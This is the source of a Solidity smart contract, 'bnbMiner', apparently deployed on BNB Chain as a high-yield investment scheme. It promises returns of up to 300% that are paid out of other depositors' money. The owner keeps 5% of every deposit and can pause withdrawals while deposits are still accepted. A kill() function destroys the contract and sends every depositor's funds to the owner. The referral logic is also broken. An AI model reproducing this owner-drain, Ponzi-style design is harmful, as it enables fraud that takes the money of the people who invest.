/**
 *Submitted for verification at BscScan.com on 2022-02-19
*/

//SPDX-License-Identifier: MIT
pragma solidity =0.8.0;

contract bnbMiner {
    uint256 public totalInvestment;
    uint256 public totalInvestors;
    uint256 public totalRefRewards;
    address payable public owner;
    bool private _paused;

    struct Tariff {
        uint256 time;
        uint256 percent;
    }

    struct Deposit {
        uint256 tariff;
        uint256 amount;
        uint256 at;
    }

    struct Investor {
        bool registered;
        address referrer;
        uint256 referrer_count;
        uint256 balanceRef;
        uint256 totalRef;
        Deposit[] deposits;
        uint256 invested;
        uint256 lastPaidAt;
        uint256 withdrawn;
    }

    mapping(address => Investor) public investors;

    Tariff[] public tariffs;
    event Invested(address user, uint256 value);

    constructor() {
        owner = payable(msg.sender);
        _paused = false;
        tariffs.push(Tariff(30 days, 90));
        tariffs.push(Tariff(60 days, 200));
        tariffs.push(Tariff(90 days, 300));
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "only Owner");
        _;
    }

    modifier minimumInvest(uint256 value) {
        require(value > 0.05 ether, "min value is 0.05");
        _;
    }

    modifier ifPaused() {
        require(_paused, "investment paused");
        _;
    }

    modifier ifNotPaused() {
        require(!_paused, "investment paused");
        _;
    }

    function Invest(address referrer, uint8 tariff)
        public
        payable
        minimumInvest(msg.value)
    {
        if (!investors[msg.sender].registered) {
            totalInvestors++;
            investors[msg.sender].registered = true;

            if (!investors[referrer].registered && referrer != msg.sender) {
                investors[msg.sender].referrer = referrer;
                investors[referrer].referrer_count++;
            }
        }

        investors[referrer].balanceRef += (msg.value * 5) / 100;
        totalRefRewards += (msg.value * 5) / 100;
        totalInvestment += msg.value;
        investors[msg.sender].deposits.push(
            Deposit(tariff, msg.value, block.timestamp)
        );

        owner.transfer(msg.value / 20);
        emit Invested(msg.sender, msg.value);
    }

    function withdrawable(address user) public view returns (uint256 amount) {
        investors[user].deposits;
        for (
            uint256 index = 0;
            index < investors[user].deposits.length;
            index++
        ) {
            Deposit memory dep = investors[user].deposits[index];
            Tariff memory tariff = tariffs[dep.tariff];
            uint256 finishDate = dep.at + tariff.time;
            uint256 fromDate = investors[user].lastPaidAt > dep.at
                ? investors[user].lastPaidAt
                : dep.at;
            uint256 toDate = block.timestamp > finishDate
                ? finishDate
                : block.timestamp;

            if (fromDate < toDate) {
                amount +=
                    (dep.amount * (toDate - fromDate) * tariff.percent) /
                    tariff.time /
                    100;
            }
        }
    }

    function Withdraw() public ifNotPaused {
        Investor storage investor = investors[msg.sender];
        uint256 amount = withdrawable(msg.sender);
        amount += investor.balanceRef;

        investor.lastPaidAt = block.timestamp;
        investor.balanceRef = 0;

        payable(msg.sender).transfer(amount);
        investor.withdrawn += amount;
    }

    function pause() public onlyOwner ifNotPaused {
        _paused = true;
    }

    function unpause() public onlyOwner ifPaused {
        _paused = false;
    }

    function kill() public onlyOwner {
        selfdestruct(owner);
    }
}